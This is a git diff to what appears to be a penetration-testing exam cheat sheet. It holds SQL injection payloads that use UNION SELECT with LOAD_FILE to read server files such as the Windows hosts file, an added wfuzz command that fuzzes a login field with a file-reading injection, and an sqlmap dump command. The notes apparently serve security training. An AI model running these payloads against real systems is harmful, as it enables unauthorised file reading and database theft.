@@ -67,6 +67,15 @@ SELECT * LOAD_FILE('C:\Windows\System32\drivers\etc\hosts')
 x' UNION SELECT 1, LOAD_FILE('C:\Windows\System32\drivers\etc\hosts'),3-- -
 ```
 
+Combining website LFI
+
+```shell
+wfuzz -z file,/tmp/file_inclusion_linux.txt -d "username=' UNION SELECT 1, LOAD_FILE('FUZZ'), 3, 4, 5, 6; -- -" --hw 89 <url>
+# -d postdata
+# -z file,wordlist
+# hw:hide responses words
+```
+
 ### :no_entry: sqlmap (:radioactive::radioactive::radioactive: cannot be used in the exam)
 
 ```
@@ -77,4 +86,5 @@ sqlmap -r post.txt -p "parameter_name" --dump -C "columns" -T "tables" -D "datab
 post.txt = request contents
 
 ![SQLi_2022 02 28_19h37m55s_001](https://user-images.githubusercontent.com/8998412/155977929-7e38d3bb-8d61-4afa-af6b-90ae1e13ec73.png)
+
 
